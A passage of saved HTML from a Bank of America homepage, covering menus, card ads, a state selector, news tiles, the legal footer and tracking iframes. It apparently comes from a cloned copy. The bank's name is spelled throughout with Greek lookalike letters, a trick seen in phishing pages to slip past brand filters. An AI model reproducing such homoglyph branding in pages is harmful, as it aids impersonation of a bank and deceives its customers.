                                        <a name="explore_popular_features" href=" /online-banking/mobile-and-online-banking-features/" target="_self" adbe-handled="true">Explore popular features
                    <span class="submenu-right-desc">See how to get the most out<br>of Mobile &amp; Online Banking</span></a>




                                </div>
                                <div class="clear-both"></div>
                                <span class="ada-hidden">End of submenu</span>
                            </div>


                </li>



            <li>
                        <a href="javascript:void(0);" title="" style="width:154px" class="">Credit Cards<span class="ada-hidden"> menu. Press Enter to access submenu. To move through items press up or down arrow.</span></a>

                    <div class="submenu" style="background: rgb(255, 255, 255); visibility: hidden; width: 261px; display: block;">
                        <div class="submenu-singlecol">
                                    <a name="popular_credit_cards" href=" /credit-cards/overview.go" target="_self" adbe-handled="true">Popular Credit Cards</a>




                                    <a name="cash_rewards_cards" href=" /credit-cards/cash-back-credit-cards.go?VIEW=List" target="_self" adbe-handled="true">Cash Rewards Cards</a>




                                    <a name="travel_amp_airline_rewards_cards" href=" /credit-cards/travel-credit-cards.go?VIEW=List" target="_self" adbe-handled="true">Travel &amp; Airline Rewards Cards</a>




                                    <a name="lower_interest_rate_cards" href=" /credit-cards/low-interest-credit-cards.go?VIEW=List" target="_self" adbe-handled="true">Lower Interest Rate Cards</a>




                                    <a name="cards_to_build_or_rebuild_credit" href=" /credit-cards/credit-cards-to-build-credit.go?VIEW=List" target="_self" adbe-handled="true">Cards to Build or Rebuild Credit</a>




                                    <a name="small_business_cards" href="s://business.   /creditcard/HomePage" target="_self" adbe-handled="true">Small Business Cards</a>




                                    <a name="shop_all_credit_cards" href=" /credit-cards/view-all-credit-cards.go" target="_self" adbe-handled="true">Shop All Credit Cards</a>




                                    <a name="check_for_customized_offers" href="s://secure.   /login/eclo/entry/findCustomizedOffer.go?subchannel=ECENHN" target="_self" adbe-handled="true">Check for Customized Offers</a>



                        <div class="dash-border"></div>

                                    <a name="manage_your_credit_card_account" href=" /credit-cards/manage-your-credit-card-account.go" target="_self" adbe-handled="true">Manage Your Credit Card Account</a>




                        </div>
                        <div class="clear-both"></div>
                        <span class="ada-hidden">End of submenu</span>
                    </div>

                </li>



            <li>
                        <a href="javascript:void(0);" title="" style="width:105px" class="">Loans<span class="ada-hidden"> menu. Press Enter to access submenu. To move through items press up or down arrow.</span></a>

                    <div class="submenu" style="background: rgb(255, 255, 255); visibility: hidden; width: 147px; display: block;">
                        <div class="submenu-singlecol">
                                    <a name="mortgage" href=" /home-loans/mortgage/overview.go" target="_self" adbe-handled="true">Mortgage</a>




                                    <a name="refinance" href=" /home-loans/refinance/overview.go" target="_self" adbe-handled="true">Refinance</a>




                                    <a name="home_equity" href=" /home-loans/home-equity-loans/overview.go" target="_self" adbe-handled="true">Home Equity</a>




                                    <a name="auto_loans" href=" /auto-loans/" target="_self" adbe-handled="true">Auto Loans</a>




                                    <a name="business_loans" href=" /smallbusiness/business-financing.go" target="_self" adbe-handled="true">Business Loans</a>



                        <div class="dash-border"></div>

                                    <a name="l2_loans_more_products" href=" /sitemap/personal.go" target="_self" adbe-handled="true">More <span class="ada-hidden">Loan</span> Products</a>




                        </div>
                        <div class="clear-both"></div>
                        <span class="ada-hidden">End of submenu</span>
                    </div>

                </li>



            <li>
                    <a class="investbull" href="javascript:void(0);" title="" style="width:190px"><span class="invest">Investments </span><span class="ada-hidden"> menu. Press Enter to access submenu. To move through items press up or down arrow.</span></a>
                    <div class="submenu" style="background: rgb(255, 255, 255); visibility: hidden; width: 301px; display: block;">
                        <div class="submenu-singlecol">
                                    <a name="l2_investments_streamline_investing" href="s://e/m/pages/home.aspx?src_cd=bac_hp_nav_streamline" target="_self" adbe-handled="true"><strong>Streamline Investing with Merrill Edge</strong></a>




                                    <a name="why_merrill_edge" href="s://e/why-merrill-edge?src_cd=bac_hp_nav_whyedge" target="_self" adbe-handled="true">Why Merrill Edge</a>




                                    <a name="retirement" href="s://e/retirement-planning?src_cd=bac_hp_nav_retirement" target="_self" adbe-handled="true">Retirement</a>




                                    <a name="ira_and_401k_rollovers" href="s://e/retirement/ira?src_cd=bac_hp_nav_ira" target="_self" adbe-handled="true">IRA and 401(k) Rollovers</a>




                                    <a name="529_amp_college_savings_plans" href="s://e/college-savings/529?src_cd=bac_hp_nav_529" target="_self" adbe-handled="true">529 &amp; College Savings Plans</a>




                                    <a name="investment_products" href="s://e/investment-products?src_cd=bac_hp_nav_products" target="_self" adbe-handled="true">Investment Products</a>



                        <div class="dash-border"></div>

                                    <a name="merrill_lynch_wealth_management" href="://wealthmanagement.ml/wm/pages/home.aspx" target="_self" adbe-handled="true">Merrill Lynch Wealth Management</a>




                                    <a name="us_trust_private_wealth_management" href="://ustrust/ust/pages/index.aspx" target="_self" adbe-handled="true">U.S. Trust Private Wealth Management</a>




                        </div>
                        <div class="clear-both"></div>
                        <span class="ada-hidden">End of submenu</span>
                    </div>

                </li>



                <li class="last">
                        <a href="javascript:void(0);" class="last-tab" title="" style="width:121px">Learning
                        <span class="ada-hidden"> menu. Press Enter to access submenu. To move through items press up or down arrow.</span></a>
                        <!-- Last tab else block -->
                        <div class="submenu-last" style="background:#FFFFFF">
                            <div class="submenu-singlecol">
                                    <a name="budgeting_amp_saving" href=" /deposits/managing-your-money.go" target="_self" adbe-handled="true">Budgeting &amp; Saving</a>




                                    <a name="managing_credit" href=" /credit-cards/credit-education.go" target="_self" adbe-handled="true">Managing Credit</a>




                                    <a name="home_buying" href=" /home-loans/mortgage/home-mortgage-loan-options.go" target="_self" adbe-handled="true">Home Buying</a>




                                    <a name="retirement_planning" href=" /planning/retirement.go" target="_self" adbe-handled="true">Retirement Planning</a>




                                    <a name="planning_for_life_events" href=" /planning/life-events.go" target="_self" adbe-handled="true">Planning for Life Events</a>




                                    <a name="college_planning" href=" /planning/college.go" target="_self" adbe-handled="true">College Planning</a>




                                    <a name="privacy_amp_security" href=" /privacy/overview.go" target="_self" adbe-handled="true">Privacy &amp; Security</a>



                        <div class="dash-border"></div>

                                    <a name="bettermoneyhabits" href="s://bettermoneyhabits/" target="_self" adbe-handled="true">BetterMoneyHabits<br><span style="color:#666666; display:block; padding-top:8px">Videos and tips to better<br>manage your financial life.</span></a>




                            </div>
                            <div class="clear-both"></div>
                            <span class="ada-hidden">End of submenu</span>
                        </div>


                </li>
    </ul>
</form>


    <div class="hp-page-title-module-hidden-skin ada-hidden h-100" id="skip-to-h1">
        <h1>Βank of Αmerica — Banking, Credit Cards, Mortgages and Auto Loans</h1>
    </div>

<div class="TargetedAd">
<div class="Default">

</div>
<script>
        var isBusinessEventEnabled = false;
</script>
<div class="erCloak" style="opacity: 1;">
             <div id="Imported-default-BOA_HOME_SIGNON_HERO-0" style="visibility: visible; display: block;"><div id="Click-BOA_HOME_SIGNON_HERO" onclick="Factories.get('default').getSignaler().signal('click', 'BOA_HOME_SIGNON_HERO-clicked', 'Target=68428')"><div class="media-module">
<img src="./IMG/Full.gif" alt="No annual fee on these BankAmericard® credit cards. Choose the card that works for you" width="993" height="300" usemap="#ImgMap" border="0" name="CCW4CHSU">
<map name="ImgMap" id="ImgMap">
<area shape="rect" coords="782,283,993,300" href="://promo.   /reviews/?code=VACOU0&amp;cm_sp=Cons-CC-_-Card-Rewards-_-CCW4CHSU05_bc4s95_hm_champtest1e_arvnmjgs_s.gif" alt="See Important Information About Reviews" title="See Important Information About Reviews">
<area shape="rect" coords="743,0,993,300" href="s://consumer.   /USCCapp/Ctl/entry?sc=VACOSD&amp;cm_sp=Cons-CC-_-Card-Rewards-_-CCW4CHSU04_bc4s95_hm_champtest1e_arvnmjgs_s.gif" alt="BankAmericard® credit card. I want a 0% Intro APR offer. Offer details" title="BankAmericard® credit card. I want a 0% Intro APR offer. Offer details">
<area shape="rect" coords="497,0,741,300" href="s://consumer.   /USCCapp/Ctl/entry?sc=VACM9A&amp;cm_sp=Cons-CC-_-Card-Rewards-_-CCW4CHSU03_bc4s95_hm_champtest1e_arvnmjgs_s.gif" alt="BankAmericard® Better Balance Rewards™ Card. I want to pay my balance down faster. Offer details" title="BankAmericard® Better Balance Rewards™ Card. I want to pay my balance down faster. Offer details">
<area shape="rect" coords="250,0,495,300" href="s://consumer.   /USCCapp/Ctl/entry?sc=VACL16&amp;cm_sp=Cons-CC-_-Card-Rewards-_-CCW4CHSU02_bc4s95_hm_champtest1e_arvnmjgs_s.gif" alt="BankAmericard Travel Rewards®. I want travel rewards. Offer details" title="BankAmericard Travel Rewards®. I want travel rewards. Offer details">
<area shape="rect" coords="0,0,248,300" href="s://consumer.   /USCCapp/Ctl/entry?sc=VACKN9&amp;cm_sp=Cons-CC-_-Card-Rewards-_-CCW4CHSU01_bc4s95_hm_champtest1e_arvnmjgs_s.gif" alt="BankAmericard Cash Rewards™. I want cash back. Offer details" title="BankAmericard Cash Rewards™. I want cash back. Offer details">
</map></div></div></div>
              </div>

</div>







<div class="state-selector-pbi-hp-module">
    <div class="state-form">


        <form id="stateSelect" name="stateSelectForm" action=" /homepage/stateSelect.go" method="post">         
            
            <input type="hidden" name="state" value="MA">               
            
                            
            <label for="pick_state">Information for:</label>    
            
<select name="prefState" id="pick_state" class="select-bofa select-bofa-fxWdth" title="Select a state" required="true">
    <option value=" ">Select a state</option>
    <option value="AL">Alabama</option>
    <option value="AK">Alaska</option>
    <option value="AZ">Arizona</option>
    <option value="AR">Arkansas</option>
    <option value="CA">California</option>
    <option value="CO">Colorado</option>
    <option value="CT">Connecticut</option>
    <option value="DE">Delaware</option>
    <option value="DC">District of Columbia</option>
    <option value="FL">Florida</option>
    <option value="GA">Georgia</option>
    <option value="HI">Hawaii</option>
    <option value="ID">Idaho</option>
    <option value="IL">Illinois</option>
    <option value="IN">Indiana</option>
    <option value="IA">Iowa</option>
    <option value="KS">Kansas</option>
    <option value="KY">Kentucky</option>
    <option value="LA">Louisiana</option>
    <option value="ME">Maine</option>
    <option value="MD">Maryland</option>
    <option value="MA" selected="selected">Massachusetts</option>
    <option value="MI">Michigan</option>
    <option value="MN">Minnesota</option>
    <option value="MS">Mississippi</option>
    <option value="MO">Missouri</option>
    <option value="MT">Montana</option>
    <option value="NE">Nebraska</option>
    <option value="NV">Nevada</option>
    <option value="NH">New Hampshire</option>
    <option value="NJ">New Jersey</option>
    <option value="NM">New Mexico</option>
    <option value="NY">New York</option>
    <option value="NC">North Carolina</option>
    <option value="ND">North Dakota</option>
    <option value="OH">Ohio</option>
    <option value="OK">Oklahoma</option>
    <option value="OR">Oregon</option>
    <option value="PA">Pennsylvania</option>
    <option value="RI">Rhode Island</option>
    <option value="SC">South Carolina</option>
    <option value="SD">South Dakota</option>
    <option value="TN">Tennessee</option>
    <option value="TX">Texas</option>
    <option value="UT">Utah</option>
    <option value="VT">Vermont</option>
    <option value="VA">Virginia</option>
    <option value="WA">Washington</option>
    <option value="WV">West Virginia</option>
    <option value="WI">Wisconsin</option>
    <option value="WY">Wyoming</option>


</select>

            <a name="state_selector_submit" class="btn-bofa btn-bofa-blue btn-bofa-small btn-bofa-noRight" href="javascript:void(0);" onclick="javascript:stateSelectSubmit(); return false;">Go<span class="ada-hidden"> and get state information</span></a>
                    
            <div id="flex-modal-state-alert-layer" class="hide">
                <div class="flex-alert-icon"></div>
                <div class="flex-alert-content">
                    <div class="flex-modal-main-content">
                        <p>Please select a state from the dropdown menu to get information about that state's offerings.</p>
                    </div>
                    <div class="buttons-container">
                        <a href="javascript:void(0);" class="btn-bofa btn-bofa-blue btn-bofa-small mrt-15 btn-bofa-noRight" id="cancelFlexModalStateAlertLayer"><span>OK</span></a>
                    </div>
                </div>
                <div class="clearboth"></div>
            </div>
        </form>
        
    </div>
</div>
        

<div class="hp-info-link-module"> 
<!-- Website ad practices links-->
    <a href="javascript:void(0);" name="advertising_practices" class="boa-dialog boa-com-info-layer-link dotted" rel="website-ad-practices">Advertising Practices<span class="boa-ada-text ada-hidden">&nbsp;layer</span><span class="boa-ada-text ada-hidden">&nbsp;layer</span><span class="boa-ada-text ada-hidden">&nbsp;layer</span><span class="boa-ada-text ada-hidden">&nbsp;layer</span><span class="boa-ada-text ada-hidden">&nbsp;layer</span><span class="boa-ada-text ada-hidden">&nbsp;layer</span></a>
     <div id="website-ad-practices" class="hide">
     <h3>Advertising Practices</h3>
        <p>We strive to provide you with information about products and services you might find interesting and useful. Relationship-based ads and online behavioral advertising help us do that.</p>
<p>Here's how it works: We gather information about your online activities, such as the searches you conduct on our Sites and the pages you visit. This information may be used to deliver advertising on our Sites and offline (for example, by phone, email and direct mail) that's customized to meet specific interests you may have.</p>
<p>If you prefer that we do not use this information, you may <a onclick="$('.ui-dialog').remove();" name="WebsiteAdPractices_OptOut" href=" /privacy/online-privacy-notice.go#advertising-on-our-sites" target="_blank">opt out of online behavioral advertising</a>. If you opt out, though, you may still receive generic advertising. In addition, financial advisors/Client Managers may continue to use information collected online to provide product and service information in accordance with account agreements.</p>
<p>Also, if you opt out of online behavioral advertising, you may still see ads when you sign in to your account, for example through Online Banking or MyMerrill. These ads are based on your specific account relationships with us.</p>
<p>To learn more about relationship-based ads, online behavioral advertising and our privacy practices, please review the <a onclick="$('.ui-dialog').remove();" name="WebsiteAdPractices_PrivacyNotice" href=" /privacy/online-privacy-notice.go" target="_blank">Βank of Αmerica Online Privacy Notice</a> and our <a onclick="$('.ui-dialog').remove();" name="Online-privacy-faqs" href=" /privacy/faq/online-privacy-faq.go" target="_blank">Online Privacy FAQs</a>.</p>
    </div>
</div>
                <div class="clearboth"></div>
            </div>
            <div id="hp-section-3">


  

  
<div class="hp-flow-horizontal-pipe-delimited-container">
    <div class="hpipe-body"> 
            <div class="four-column left-column equal-height-column">

<div class="TargetedAd">
<div class="Default">

</div>
<script>
        var isBusinessEventEnabled = false;
</script>
<div class="erCloak" style="opacity: 1;">
             <div id="Imported-default-BOA_HOME_SIGNON_SERVICE_01-0" style="visibility: visible; display: block;"><div id="Click-BOA_HOME_SIGNON_SERVICE_01" onclick="Factories.get('default').getSignaler().signal('click', 'BOA_HOME_SIGNON_SERVICE_01-clicked', 'Target=68428')"><div class="media-module"><a href="://promo.   /checking_choice/index4.html?cm_sp=DEP-Checking-_-Checking-_-DCT8C16Z_15dep65_sc_checking_arn9pb65_s.gif" name="DCT8C16Z" target="_self"><img src="./IMG/15dep65_sc_checking_arn9pb65_s.gif" alt="Open checking account. Get Online, Mobile and ATM access, plus Bill Pay, alerts and more. Get Started" title="Open checking account. Get Online, Mobile and ATM access, plus Bill Pay, alerts and more. Get Started" width="223" height="115"></a></div></div></div>
              </div>

</div>


</div> 
            <div class="four-column equal-height-column">

<div class="TargetedAd">
<div class="Default">

</div>
<script>
        var isBusinessEventEnabled = false;
</script>
<div class="erCloak" style="opacity: 1;">
             <div id="Imported-default-BOA_HOME_SIGNON_SERVICE_02-0" style="visibility: visible; display: block;"><div id="Click-BOA_HOME_SIGNON_SERVICE_02" onclick="Factories.get('default').getSignaler().signal('click', 'BOA_HOME_SIGNON_SERVICE_02-clicked', 'Target=41035')"><div class="media-module"><a href="://promo.   /multiproduct/desktop?cm_sp=ESZ-EnterpriseSales-_-BACAnnouncement-_-EST2C203_sc_newtoboa_arbsfcbx_fs8o73_e.gif" name="EST2C203" target="_self"><img src="./IMG/sc_newtoboa_arbsfcbx_fs8o73_e.gif" alt="New to Βank of Αmerica? Explore banking solutions from Βank of Αmerica® and investment services from Merrill Edge®. Learn more" title="New to Βank of Αmerica? Explore banking solutions from Βank of Αmerica® and investment services from Merrill Edge®. Learn more" width="223" height="115"></a></div></div></div>
              </div>

</div>


</div>
            <div class="four-column equal-height-column">

<div class="TargetedAd">
<div class="Default">

</div>
<script>
        var isBusinessEventEnabled = false;
</script>
<div class="erCloak" style="opacity: 1;">
             <div id="Imported-default-BOA_HOME_SIGNON_SERVICE_03-0" style="visibility: visible; display: block;"><div id="Click-BOA_HOME_SIGNON_SERVICE_03" onclick="Factories.get('default').getSignaler().signal('click', 'BOA_HOME_SIGNON_SERVICE_03-clicked', 'Target=41035')"><div class="media-module"><a href="://about.   /en-us/partnering-locally/empowering-troops-financial-transition.html?cm_sp=EBZ-Corp_SocialResponsibility-_-CorporateSocialResponsibility-_-EIT1C3CP_sc_miltimespostevent_argblyy7_s.gif" name="EIT1C3CP" target="_self"><img src="./IMG/sc_miltimespostevent_argblyy7_s.gif" alt="Empowering veterans. Partnering to help veterans in their financial transition. Watch webinar" title="Empowering veterans. Partnering to help veterans in their financial transition. Watch webinar" width="223" height="115"></a></div></div></div>
              </div>

</div>


</div>
            <div class="four-column last-column equal-height-column">

<div class="TargetedAd">
<div class="Default">

</div>
<script>
        var isBusinessEventEnabled = false;
</script>
<div class="erCloak" style="opacity: 1;">
             <div id="Imported-default-BOA_HOME_SIGNON_SERVICE_04-0" style="visibility: visible; display: block;"><div id="Click-BOA_HOME_SIGNON_SERVICE_04" onclick="Factories.get('default').getSignaler().signal('click', 'BOA_HOME_SIGNON_SERVICE_04-clicked', 'Target=61112')"><div class="media-module"><a href=" /planning/college.go?cm_sp=GWM-529CollegeSavingsPlan-_-529CollegeSavingsPlan-_-MFT4C447_sc_collegehub-02_arc79cnm_e.gif" name="MFT4C447" target="_self"><img src="./IMG/sc_collegehub-02_arc79cnm_e.gif" alt="Pay for college. Map out a strategy with Merrill Edge®. Before College, Nearing College, During College. Learn more" title="Pay for college. Map out a strategy with Merrill Edge®. Before College, Nearing College, During College. Learn more" width="223" height="115"></a></div></div></div>
              </div>

</div>


</div>                
        <div class="clearboth"></div>
    </div>
</div>            
            </div>
            <div id="hp-section-4">



<div class="flow-horizontal-container">
            <div class="horizontal-container">









        
                <div class="flex-pbi-hp-module sup-ie flex-border-right" style="width: 373px; height: 201px;">  
                
                    <div class="flex-content-section"> 
                    
                    
                             
                                
                                    <div class="header-row">
                                         <h2>$100 online bonus offer</h2>
                                         <div class="clearboth"></div>
                                    </div>
                                
                                    <div class="paragraph-row">                     
                                        <p>Earn cash back with the BankAmericard Cash Rewards credit card — 1% cash back on every purchase, 2% at grocery stores and <strong>now at wholesale clubs</strong>, and 3% on gas (up to $2,500 in grocery/wholesale club/gas quarterly spend) with no changing categories and no annual fee.<br><br><a href="s://consumer.   /USCCapp/Ctl/entry?sc=VACLLS" name="dz1_BankAmericardCR" target="_self">Learn more — BankAmericard Cash Rewards™»</a></p>
                                        <div class="clearboth"></div>
                                    </div>
                        
                                                                                                    
                            <div class="list-row">                                                     
                                    <ul>                
                                                
                                                    <li>
<span class="clearboth"></span>
                                                    </li>   
                                    </ul>                            
                            </div>
                    </div>
        </div>
            </div>
            <div class="horizontal-container">









        
                <div class="flex-pbi-hp-module sup-ie flex-border-right" style="width: 373px; height: 201px;">  
                
                    <div class="flex-content-section"> 
                    
                    
                             
                                
                                    <div class="header-row">
                                         <h2>Help with your home loan payments</h2>
                                         <div class="clearboth"></div>
                                    </div>
                                
                                    <div class="paragraph-row">                     
                                        <p>If you're a homeowner struggling with your loan payments, learn about our <a href="s://homeloanhelp.   /en/index.html?cm_sp=Cre-LoanModification-_-Home%20Loan%20Assistance%20Q4%202012-_-MI14LT0001_Dialogue%20Zone%202_LearnMoreLAH" name="dz2_homeLoanAssistance" target="_self">home loan assistance programs</a> and the <a href="s://homeloanhelp.   /en/doj-settlement.html" name="dz2_DOJSettlement" target="_self">Department of Justice Settlement»</a></p>
                                        <div class="clearboth"></div>
                                    </div>
                        
                                                                                                    
                            <div class="list-row">                                                     
                                    <ul>                
                                                
                                                    <li>
<span class="clearboth"></span>
                                                    </li>   
                                                
                                                    <li>
<span class="clearboth"></span>
                                                    </li>   
                                    </ul>                            
                            </div>
                    </div>
        </div>
            </div>
            <div class="horizontal-container">








    <!-- flex-pbi-hp-module-privacy-skin.ftl -->
    

    
                    <div class="flex-pbi-hp-module sup-ie" style="width: 243px; height: 201px;">  
                    <!-- flex-pbi-hp-module-privacy-skin.ftl-LinkList1 -->
                        <!--Parameters fetched from DCR-->
                    
                            <div class="flex-content-section">
                                <!--flex-pbi-hp-module with section.linktype url -->
                                    <!--flex-pbi-hp-module header -->
                                    <div class="header-row">
                                         <h2>Popular links</h2>
                                         <div class="clearboth"></div>
                                    </div>
                                
                            <!--flex-pbi-hp-module links -->                                                                            
                            <div class="list-row">                                         
                                    <ul class="gray-sq-bullet">  
                                                <!--flex-pbi-hp-module - links.linktype url -->  
                                                
                                                    <li>
                                                        <a name="get-the-mobile-banking-app " href=" /online-banking/mobile-and-online-banking-features/#defaultWhatsNew" class="">Get the Mobile Banking app</a> <span class="clearboth"></span>
                                                    </li>
                                                <!--flex-pbi-hp-module - links.linktype url -->  
                                                
                                                    <li>
                                                        <a name="popular_meet_face_to_face" href="s://secure.   /mycommunications/public/appointments/landing.go?marketingCode=HPPOPULARLINKS_ECHMPG" class="">Schedule an appointment</a> <span class="clearboth"></span>
                                                    </li>
                                                <!--flex-pbi-hp-module - links.linktype url -->  
                                                
                                                    <li>
                                                        <a name="popular_open_new_account" href="://promo.   /hp-oaa2/" class="">Open a new account</a> <span class="clearboth"></span>
                                                    </li>
                                                <!--flex-pbi-hp-module - links.linktype url -->  
                                                
                                                    <li>
                                                        <a name="popular_order_checks" href="s://secure.   /login/sign-in/signOnScreen.go?reason=hlporderchkdeposit" class="">Order checks</a> <span class="clearboth"></span>
                                                    </li>
                                                <!--flex-pbi-hp-module - links.linktype url -->  
                                                
                                                    <li>
                                                        <a name="popular_tell_us_traveling" href="s://secure.   /login/sign-in/signOnScreen.go?reason=travelnotice" class="">Tell us you're traveling</a> <span class="clearboth"></span>
                                                    </li>
                                                <!--flex-pbi-hp-module - links.linktype url -->  
                                                
                                                    <li>
                                                        <a name="popular_life_events" href=" /planning/life-events.go" class="">Plan for major life events</a> <span class="clearboth"></span>
                                                    </li>
                                    </ul>                            
                            </div>
                            </div>
            </div>      
    
            </div>
    <div class="clearboth"></div>
</div>
            </div>
            <div id="hp-section-5">



                    <!-- 
 MODULE: 
     isModule: true
     ID: 8EABDBB0-9B59-4FB9-8986-61F1AEA3300B
     Name: hp-ticker-module
     Skin: news-info-tiles -->
 
<div class="hp-ticker-module">
    <div class="news-info-tiles-skin">
        <h2 class="header">Your news and information</h2>
<!-- New skin for YN&I design for homepage  -->
                <div class="tile ">
                    <h3 class="hpheader"><p>New in our Mobile App</p></h3>
                    
                         <a id="introducing_Zelle" name="introducing_Zelle" href="://promo.   /zelle">
                            <img width="233" height="160" alt="" src="IMG/column1July2017.jpg">
                            <span class="article-title"> Send money in minutes to almost anyone, using Zelle </span>
                         </a>

                    <ul>
                                    <li></li>
                    </ul>
                </div>
                <div class="tile ">
                    <h3 class="hpheader"><p>Travel Insights</p></h3>
                    
                         <a id="international_tipping_guide" name="international_tipping_guide" href="s://bettermoneyhabits.   /en/saving-budgeting/tipping-abroad-guide">
                            <img width="233" height="160" alt="" src="IMG/column2July2017.png">
                            <span class="article-title"> International tipping guide </span>
                         </a>

                    <ul>
                                    <li></li>
                    </ul>
                </div>
                <div class="tile ">
                    <h3 class="hpheader"><p>Security tips</p></h3>
                    
                         <a id="identity_theft_tips" name="identity_theft_tips" href="s://bettermoneyhabits.   /en/privacy-security/victim-identity-theft">
                            <img width="233" height="160" alt="" src="IMG/column3July2017.png">
                            <span class="article-title"> Victims of identity theft: 5 steps to take action </span>
                         </a>

                    <ul>
                                    <li></li>
                    </ul>
                </div>
                <div class="tile last">
                    <h3 class="hpheader"><p>Saving and budgeting</p></h3>
                    
                         <a id="spending_tool" name="spending_tool" href="s://bettermoneyhabits.   /en/saving-budgeting/spending-tool">
                            <img width="233" height="160" alt="" src="IMG/column4July2017.png">
                            <span class="article-title"> Spending analysis tool </span>
                         </a>

                    <ul>
                               <li class="has-image">                            
                                        <a href="s://bettermoneyhabits/" id="Better Money Habits by Βank of Αmerica with Khan Academy" class="add-border">
                                            <img width="192" height="41" alt="Better Money Habits by Βank of Αmerica with Khan Academy" src="IMG/BMH_logo.jpg">  
                                        </a>
                               </li>
                    </ul>
                </div>
        <div class="clearboth"></div>
    </div>
</div>








        <div class="hp-global-footer-module">
                        <div class="olb-agree">
            <a name="footer_onlinebankingserviceagreement" href=" /online-banking/service-agreement.go" target="_self">Online Banking Service Agreement</a>
</div>

            <div class="global-footer-main">
                <div class="corporate-info">
                    <p>Banking, mortgage and home equity products offered by Βank of Αmerica, N.A., and affiliated banks, Members FDIC and wholly owned subsidiaries of Βank of Αmerica Corporation. Credit and collateral are subject to approval. Terms and conditions apply. This is not a commitment to lend. Programs, rates, terms and conditions are subject to change without notice.</p>
<p>Investment and insurance products:</p>
<table summary="table with investment and insurance product details" border="0">
<tbody>
<tr>
<td class="leftcell">Are Not FDIC Insured</td>
<td class="cell">Are Not Bank Guaranteed</td>
<td class="cell">May Lose Value</td>
</tr>
<tr>
<td>Are Not Deposits</td>
<td>Are Not Insured by Any Federal Government Agency</td>
<td>Are Not a Condition to Any Banking Service or Activity</td>
</tr>
</tbody>
</table>
<p>Merrill Edge, available through Merrill Lynch, Pierce, Fenner &amp; Smith Incorporated ("MLPF&amp;S"), consists of Merrill Edge Advisory Center (investment guidance) or self-directed online investing.</p>
<p>Merrill Lynch Wealth Management makes available products and services offered by Merrill Lynch, Pierce, Fenner &amp; Smith Incorporated.</p>
<p>MLPF&amp;S is a registered broker-dealer, Member <a href=" /vanity/bac-interstitial.go?target=://sipc.org/?_tps=79bfc10d-6538-49e6-ab2f-a6c785e73867" name="footer_SIPC" target="_self">SIPC</a> and a wholly owned subsidiary of Βank of Αmerica Corporation.</p>
<p>Insurance products are offered through Merrill Lynch Life Agency Inc., Βank of Αmerica, N.A. and/or Banc of America Insurance Services, Inc., all of which are licensed insurance agencies and wholly-owned subsidiaries of Βank of Αmerica Corporation.</p>
                </div>
                <div class="footer-bottom-section">
                    <div class="footer-bottom-left">
                        <ul class="footer-link-list">
                                        <li class="first">
            <a name="footer_locations" href="s://locators.   /" target="_self">Locations</a>
</li>
                                        <li>
            <a name="footer_contactus" href=" /contactus/contactus.go" target="_self">Contact Us</a>
</li>
                                        <li>
            <a name="footer_help" href=" /help/overview.go" target="_self">Help</a>
</li>
                                        <li>
            <a name="footer_accessiblebanking" href=" /accessiblebanking/overview.go" target="_self">Accessible Banking</a>
</li>
                                        <li>
            <a name="footer_careers" href="://careers.   /careershome.aspx" target="_self">Careers</a>
</li>
                                        <li>
            <a name="footer_privacyandsecurity" href=" /privacy/overview.go" target="_self">Privacy &amp; Security</a>
</li>
                                        <li>
            <a name="footer_mcafeeinternetsecurity" href=" /privacy/online-mobile-banking-privacy/mcafee-antivirus-free-trial.go" target="_self">McAfee<sup>®</sup> Internet Security</a>
</li>
                                        <li class="last">
            <a name="footer_sitemap" href=" /sitemap/personal.go" target="_self">Site Map</a>
</li>
                        </ul>
                        <div class="clearboth"></div>
                        <div class="copyright-info"><p>Βank of Αmerica, N.A. Member FDIC. <a href=" /help/equalhousing_popup.go" class="boa-window force-medium" title="Opens in a new window" name="footer_equalHousingLender">Equal Housing Lender<em class="houseIcon"></em></a><br>© 2017 Βank of Αmerica Corporation.</p></div>
                    </div>
                    <div class="footer-social-container">
                        
                        <!-- Insert social widget util loader -->




<div class="boa-social-loader" data-loaded="false" data-platform="borneo" data-options=""><div class="error-page-level hide"><div class="error-corner top-left"></div><div class="error-corner top-right"></div><div class="error-content">null</div><div class="error-corner bottom-left"></div><div class="error-corner bottom-right"></div><div id="boaSocialLoaderErrorCode" class="hide">boaSnippetLoader error.  textStatus: error errorThrown: Not Found</div></div></div>


                    </div>
                </div>
                <div class="clearboth"></div>
            </div>
        </div>              
            
            <script type="text/javascript">var axel = Math.random()+"";var a = axel * 10000000000000;document.write('<iframe title="iFrame used for layout purpose" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1;num='+ a + '?" width="1" height="1" frameborder="0" style="display:none;"></iframe>');</script><iframe title="iFrame used for layout purpose" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1;num=3744899227837.2993?" width="1" height="1" frameborder="0" style="display:none;"></iframe><iframe title="iFrame used for layout purpose" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1;num=2190916298283.3718?" width="1" height="1" frameborder="0" style="display:none;"></iframe><iframe title="iFrame used for layout purpose" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1;num=5314008783723.85?" width="1" height="1" frameborder="0" style="display:none;"></iframe><iframe title="iFrame used for layout purpose" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1;num=7940779084246.588?" width="1" height="1" frameborder="0" style="display:none;"></iframe><iframe title="iFrame used for layout purpose" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1;num=1023218564733.6567?" width="1" height="1" frameborder="0" style="display:none;"></iframe><iframe title="iFrame used for layout purpose" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1;num=7202560185380.733?" width="1" height="1" frameborder="0" style="display:none;"></iframe><iframe title="iFrame used for layout purpose" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1;num=9953193749455.137?" width="1" height="1" frameborder="0" style="display:none;"></iframe><iframe title="iFrame used for layout purpose" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1;num=7772891745806.379?" width="1" height="1" frameborder="0" style="display:none;"></iframe><iframe title="iFrame used for layout purpose" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1;num=7436118607037.609?" width="1" height="1" frameborder="0" style="display:none;"></iframe><iframe title="iFrame used for layout purpose" src="s://1359940.fls.doubleclick/activityi;src=1359940;type=front061;cat=2014_704;ord=1;num=4667060882914.409?" width="1" height="1" frameborder="0" style="display:none;"></iframe><iframe title="iFrame 